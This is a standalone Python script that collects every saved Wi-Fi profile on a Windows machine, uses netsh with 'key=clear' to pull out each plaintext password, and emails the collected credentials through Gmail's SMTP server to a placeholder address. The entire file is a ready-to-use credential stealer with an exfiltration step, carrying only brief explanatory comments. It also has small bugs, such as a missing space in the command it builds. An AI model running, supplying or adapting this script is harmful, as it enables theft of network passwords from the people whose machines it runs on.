#!/usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
# re.findall finds all characters matches the regex and puts them in a list.
result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile" + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result
# in here you checking for each wifi profile and key then append all of them in result

send_mail("YOUR_MAIL", "YOUR PASSWORD", result)
